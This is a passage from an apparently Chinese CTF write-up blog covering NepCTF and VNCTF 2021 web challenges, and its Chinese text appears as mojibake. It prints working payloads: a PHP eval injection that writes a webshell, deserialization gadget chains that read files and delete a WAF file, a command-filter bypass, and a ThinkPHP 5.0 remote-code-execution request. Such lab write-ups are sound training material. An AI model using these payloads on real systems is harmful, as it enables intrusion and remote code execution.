class="line">541071015369783257979906983920769170889508850603835680538829064360913021</span><br></pre></td></tr></table></figure><p>ç®€å• <code>long_to_bytes</code> ä¸€ä¸‹å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">541071015369783257979906983920769170889508850603835680538829064360913021</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;Qfrost_l0v3_hsy_v3r7_m0ch&#125;</span><br></pre></td></tr></table></figure><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><p>é¢˜ç›®ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å¯ä»¥çŸ¥é“ <code>intval()</code> å¤„å¯ä»¥äº§ç”Ÿä¸€ä¸ªæˆªæ–­ï¼Œå› æ­¤ <code>$len</code> å®é™…ä¸Šå¯ä»¥æ‹¼æ¥é•¿å­—ç¬¦ä¸²è€Œä¸å½±å“åˆ¤æ–­ã€‚å› æ­¤å¯ä»¥æƒ³åŠæ³•åœ¨ <code>eval()</code> ä¸­å»æ‰§è¡Œåˆ° <code>$len</code>ã€‚å› æ­¤åªéœ€è¦ <code>$nep</code> ä¸º <code>&grave;$len&grave;</code>ï¼Œå¹¶ä¸”è®© <code>$len</code> æˆªæ–­åå¾—åˆ°æ•°å­— 7 å³å¯ã€‚æ­¤æ—¶åœ¨ <code>$len</code> åæ‹¼æ¥çš„æŒ‡ä»¤å°†è¢«æ‰§è¡Œã€‚</p><p>å› æ­¤å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹è½½è·æ¥å†™å…¥ä¸€ä¸ª shellã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;?nep&#x3D;&#96;$len&#96;;&amp;len&#x3D;7%20||%20echo%20%27&lt;?php%20phpinfo();eval(&quot;$_GET[1]&quot;);%27%20&gt;%20shell.php</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è®¿é—®åˆ° <code>.../shell.php</code> å³å¯çœ‹åˆ° phpinfoã€‚ä½¿ç”¨ GET å‚æ•° 1 å³å¯ä¼ å…¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œä»è€Œè¯»åˆ°ä½äº nepctf.php é‡Œçš„ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;shell.php?1&#x3D;system(&quot;cat%20nepctf.php&quot;);</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &#39;NepCTF&#123;n3pn3p_l1ttle_tr1ck_c0me_bAck&#125;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;n3pn3p_l1ttle_tr1ck_c0me_bAck&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a href="#æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­" class="headerlink" title="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a>æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h3><h4 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h4><p>ååºåˆ—åŒ–è¯­å¥è§¦å‘çš„æ¡ä»¶å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ç”Ÿå¸¸è°ˆçš„è€ƒç‚¹ï¼Œåªéœ€è¦æ„é€  <code>a[]=0e1&amp;b[]=0e2</code> å³å¯è½»æ¾ç»•è¿‡ã€‚åŒæ—¶ï¼Œä»£ç ä¸­å‡ºç°çš„ <code>21232f297a57a5a743894a0e4a801fc3</code> å¾ˆå®¹æ˜“ä½¿ç”¨ somd5 æŸ¥å¾—æ‘˜è¦å‰çš„å€¼ä¸º adminã€‚</p><h4 id="ååºåˆ—åŒ–è¯»å–æ–‡ä»¶"><a href="#ååºåˆ—åŒ–è¯»å–æ–‡ä»¶" class="headerlink" title="ååºåˆ—åŒ–è¯»å–æ–‡ä»¶"></a>ååºåˆ—åŒ–è¯»å–æ–‡ä»¶</h4><p>ç»™å‡ºçš„ä»£ç ä¸­å¯ä»¥è§¦å‘åˆ° <code>file_get_contents</code> ä»è€Œè¯»åˆ°æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616415457020/bd4774ff20558d58744d0df46a1c8bf3dfb68e79.png"></p><p>ç»“åˆä»£ç å¼€å¤´çš„ä¸€å¥ <code>include(&#39;shell.php&#39;);</code> å¯çŸ¥éœ€è¦è¯»å–çš„æ–‡ä»¶æ˜¯ shell.phpã€‚å¾€ä¸Šè¿½æº¯ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°éœ€è¦å…ˆè§¦å‘åˆ° <code>login</code> ç±»çš„ <code>checking</code> æ–¹æ³•ã€‚å†å‘ä¸Šè¿½æº¯åˆ° <code>Game</code> ç±»çš„ <code>__destruct</code> æ–¹æ³•ã€‚å› æ­¤ç›´æ¥æ„é€ å‡ºå¦‚ä¸‹ååºåˆ—åŒ–çš„ä»£ç ç”¨ä»¥ç”Ÿæˆè½½è·å³å¯è¾¾æˆç›®çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span> . <span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$exp</span>));</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯»å–åˆ° shell.phpã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ZipArchive-åŸç”Ÿç±»åˆ é™¤æ–‡ä»¶"><a href="#ZipArchive-åŸç”Ÿç±»åˆ é™¤æ–‡ä»¶" class="headerlink" title="ZipArchive åŸç”Ÿç±»åˆ é™¤æ–‡ä»¶"></a>ZipArchive åŸç”Ÿç±»åˆ é™¤æ–‡ä»¶</h4><blockquote><p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://www.php.net/manual/zh/ziparchive.open.php#:~:text=3.%20Deletes%20the%20existing%20file%20before%20saving%20the%20temporary%20zip%20file%20on%20disk">https://www.php.net/manual/zh/ziparchive.open.php#:~:text=3.%20Deletes%20the%20existing%20file%20before%20saving%20the%20temporary%20zip%20file%20on%20disk</a></p></blockquote><p>æ ¹æ® PHP æ‰‹å†Œå¯¹äº <code>ZipArchive::open()</code> çš„æè¿°å¯çŸ¥è¿™ä¸ªæ–¹æ³•ä¼šåœ¨å‹ç¼©æ–‡ä»¶ååˆ é™¤åŸæœ¬çš„æ–‡ä»¶ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨å…¶å»åˆ é™¤åŸæœ¬å­˜åœ¨çš„ waf.txt ä»è€Œæ‰§è¡Œåˆ° <code>shell()</code> æ–¹æ³•ã€‚<code>open()</code> æ–¹æ³•çš„ç”¨æ³•æè¿°å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ZipArchive</span>::<span class="title">open</span> (<span class="params"><span class="variable">$filename</span>, <span class="variable">$flags</span> = <span class="literal">null</span></span>) <span class="title">mixed</span></span></span><br><span class="line"><span class="function">(<span class="params">PHP <span class="number">5</span> &gt;= <span class="number">5.2</span>.<span class="number">0</span>, PECL zip &gt;= <span class="number">1.1</span>.<span class="number">0</span></span>) <span class="title">Open</span> <span class="title">a</span> <span class="title">ZIP</span> <span class="title">file</span> <span class="title">archive</span></span></span><br><span class="line"><span class="function"><span class="title">Parameters</span>:</span></span><br><span class="line">string $filename        The file name of the ZIP archive to open.</span><br><span class="line"><span class="keyword">int</span>    <span class="variable">$flags</span>[optional] The mode to <span class="keyword">use</span> <span class="title">to</span> <span class="title">open</span> <span class="title">the</span> <span class="title">archive</span>.</span><br><span class="line"><span class="title">ZipArchive</span>::<span class="title">OVERWRITE</span></span><br></pre></td></tr></table></figure><p>å¯¹æ¯”æˆ‘ä»¬èƒ½å¤Ÿè§¦å‘åˆ°çš„ <code>open()</code> æ–¹æ³• <code>$this-&gt;file-&gt;open($this-&gt;filename, $this-&gt;content);</code> å¯çŸ¥æˆ‘ä»¬éœ€è¦æ§åˆ¶ <code>$this-&gt;content</code> ä¸º int ç±»å‹ã€‚æ ¹æ® <code>ZipArchive::open()</code> ä¸­å¯¹äº <code>$flags</code> çš„æè¿°å¯çŸ¥é€‰æ‹© <code>ZipArchive::OVERWRITE</code> è¾ƒåˆç†ã€‚å› æ­¤æ„é€ ååºåˆ—åŒ–ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = ZipArchive::OVERWRITE;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$exp</span>));</span><br></pre></td></tr></table></figure><p>å°†å¦‚ä¸Šä»£ç ç”Ÿæˆçš„è½½è·æ‰“å‡ºå³å¯æˆåŠŸåˆ é™¤ waf.txtã€‚</p><h4 id="shell-è¯»æ–‡ä»¶"><a href="#shell-è¯»æ–‡ä»¶" class="headerlink" title="shell è¯»æ–‡ä»¶"></a>shell è¯»æ–‡ä»¶</h4><p>shell.php ä¸­å¯¹äºä¼ å…¥çš„å†…å®¹åšäº†ä¸¥æ ¼çš„è¿‡æ»¤å¹¶ä¸”é™åˆ¶äº†é•¿åº¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span></span><br><span class="line">preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>)</span><br></pre></td></tr></table></figure><p>å› æ­¤èƒ½å¤Ÿä½¿ç”¨çš„ä¸œè¥¿åº”è¯¥éå¸¸å°‘ï¼Œå°è¯•æ„é€ å‡º <code>ls /bin</code> æ¥æŸ¥çœ‹å¯æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œå¯ä»¥æ‰¾åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash bunzip2 bzcat bzcmp bzdiff bzegrep bzexe bzfgrep bzgrep bzip2 bzip2recover bzless bzmore cat chgrp chmod chown cp dash date dd df dir dmesg dnsdomainname domainname echo egrep false fgrep findmnt grep gunzip gzexe gzip hostname kill ln login ls lsblk mkdir mknod mktemp more mount mountpoint mv nisdomainname pidof ps pwd rbash readlink rm rmdir run-parts sed sh sh.distrib sleep stty su sync tailf tar tempfile touch true umount uname uncompress vdir wdctl which ypdomainname zcat zcmp zdiff zegrep zfgrep zforce zgrep zless zmore znew</span><br></pre></td></tr></table></figure><p>ä»”ç»†çœ‹ä¸€ä¸‹æ­£åˆ™å¯ä»¥å‘ç°åæ–œæ å¹¶æ²¡æœ‰è¢«åŒ¹é…ï¼Œå› æ­¤ <code>n\l /flag</code> ä½œä¸ºä¸€ç§ä¹ä¸ªå­—ç¬¦çš„å¯è¡Œæ–¹æ¡ˆã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå› ä¸ºé¶æœºæœ¬èº«æœ‰ PHP ç¯å¢ƒï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ <code>php /flag</code> æ¥è¯»å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;b31a6e56-e2e9-41d9-8842-e54fe18a0bf9&#125;</span><br></pre></td></tr></table></figure><h3 id="faka-revenge"><a href="#faka-revenge" class="headerlink" title="faka_revenge"></a>faka_revenge</h3><p>ä¸‹è½½é™„ä»¶ä¹‹åå¯ä»¥å¾—åˆ°éƒ¨åˆ†æºç ï¼Œæœç´¢ <code>think_version</code> å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;THINK_VERSION&#x27;</span>, <span class="string">&#x27;5.0.14&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥å¾—å‡ºè¿™ä¸ª CMS ä½¿ç”¨çš„ ThinkPHP ç‰ˆæœ¬ï¼Œç”±æ­¤æ‰¾å‡ºå¯¹åº”çš„å·²ç»å‡ºç°è¿‡çš„æ¼æ´ã€‚</p><blockquote><p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://bbs.ichunqiu.com/article-1901-1.html">https://bbs.ichunqiu.com/article-1901-1.html</a></p></blockquote><p>ç¨å¾®å°è¯•å¯çŸ¥ <code>system</code> å·²ç»è¢«ç¦ç”¨äº†ï¼Œäºæ˜¯æŒ‰ç…§å‚è€ƒæ–‡ç« æ„é€ å¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;cat &#x2F;*&amp;_method&#x3D;__construct&amp;filter&#x3D;passthru</span><br></pre></td></tr></table></figure><p>å°†è½½è·æ‰“å‡ºå³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;065d8c7c-b576-40f2-bdf6-c31ef5dd65b2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF 2021</title>
      <link href="/zh-CN/posts/eb7f09c2.html"/>
      <url>/zh-CN/posts/eb7f09c2.html</url>
      
        <content type="html"><![CDATA[<h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>å®¡è®¡ä¸€ä¸‹æ¸¸æˆçš„ js ä»£ç ã€‚å‘ç°ä½œä¸ºæœ€ç»ˆå…³å¡çš„ boss ç»§æ‰¿äº† Kill çš„æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Kill()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">super</span>.Kill();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.type)</span><br><span class="line">        &#123;</span><br><span class="line">            boss = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (isFinalLevel)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// player win</span></span><br><span class="line">                <span class="keyword">new</span> Pickup(<span class="built_in">this</span>.pos, <span class="number">2</span>);</span><br><span class="line">                SpawnPickups(<span class="built_in">this</span>.pos,<span class="number">1</span>,<span class="number">40</span>);</span><br><span class="line">                winTimer.Set();</span><br><span class="line">                <span class="built_in">localStorage</span>.kbap_warp=<span class="number">0</span>;</span><br><span class="line">                <span class="built_in">localStorage</span>.kbap_won=<span class="number">1</span>;</span><br><span class="line">                speedRunTime=speedRunTime|<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (speedRunMode &amp;&amp; (!speedRunBestTime || speedRunTime &lt; speedRunBestTime))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// track best speed run time</span></span><br><span class="line">                    speedRunBestTime = speedRunTime;</span><br><span class="line">                    <span class="built_in">localStorage</span>.kbap_bestTime=speedRunBestTime;</span><br><span class="line">                &#125;</span><br><span class="line">                PlaySound(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶åˆæœ‰å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug key N to load next level</span></span><br><span class="line">    <span class="keyword">if</span> (debug &amp;&amp; KeyWasPressed(<span class="number">78</span>))</span><br><span class="line">        loadNextLevel = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nextLevel = (nextLevel+<span class="number">1</span>)%<span class="number">11</span></span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“çœ‹å‡ºæ€»å…±æœ‰ 10 å…³ï¼Œå› æ­¤åœ¨ Console ä¸­ä»¤ <code>debug=1</code> åç›´æ¥ä¸€ç›´æŒ‰ N è·³åˆ°ç¬¬åå…³ï¼Œå†æ‰§è¡Œ <code>boss.Kill()</code> å³å¯æ€æ­»æœ€ç»ˆ boss è·å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615693694736/1d9314ea61b76a67ef7c1a12a18127776595d219.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_game_is_funny!&#125;</span><br></pre></td></tr></table></figure><h3 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h3><h4 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><p>æºä»£ç é¡µé¢å®¡è®¡åˆ°å¦‚ä¸‹è·¯ç”±ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">&quot;/source&quot;</span>, <span class="function">(<span class="params">req, 